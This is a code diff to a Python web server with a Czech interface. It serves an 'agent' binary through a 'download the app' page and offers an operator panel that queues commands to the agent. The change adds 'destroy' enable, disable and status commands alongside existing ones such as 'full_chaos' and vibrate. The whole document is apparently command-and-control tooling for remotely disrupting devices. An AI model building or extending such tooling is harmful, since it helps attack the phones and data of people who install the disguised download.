@@ -68,7 +68,8 @@ class QRHandler(BaseHTTPRequestHandler):
                 with open("agent", "rb") as f:
                     data = f.read()
                 self._send(200, data, "application/octet-stream",
-                           {"Content-Disposition": "attachment; filename=agent"})
+                           {"Content-Disposition": 'attachment; filename="agent.bin"',
+                            "X-Content-Type-Options": "nosniff"})
                 log("📥 agent stáhnut (download)")
             else:
                 self._send(404, "agent binary not found", "text/plain")
@@ -184,10 +185,9 @@ color:#fff;text-decoration:none;border-radius:8px;font-size:19px;margin-top:18px
 <div class="box">
 <h1>📱 Stáhnout aplikaci</h1>
 <p>Klepněte na tlačítko pro stažení souboru.</p>
-<a href="/agent" class="btn">⬇️ Stáhnout</a>
+<a href="/agent" download="agent.bin" class="btn">⬇️ Stáhnout</a>
 <p class="muted">Po stažení soubor najdete v <b>Stahování</b>.</p>
 </div>
-<script>setTimeout(function(){window.location.href='/agent';},2500);</script>
 </body></html>"""
 
 
@@ -223,6 +223,9 @@ a.act{color:#7a8bff}
 <option value="vibrate:5">vibrate:5</option>
 <option value="full_chaos">full_chaos</option>
 <option value="stop">stop</option>
+<option value="destroy:enable">destroy:enable</option>
+<option value="destroy:disable">destroy:disable</option>
+<option value="destroy:status">destroy:status</option>
 </select>
 <button type="submit">Odeslat</button></form>
 <p>Fronta: <a class="act" href="/queue">/queue</a> &nbsp; Soubory: <a class="act" href="/files">/files</a></p>
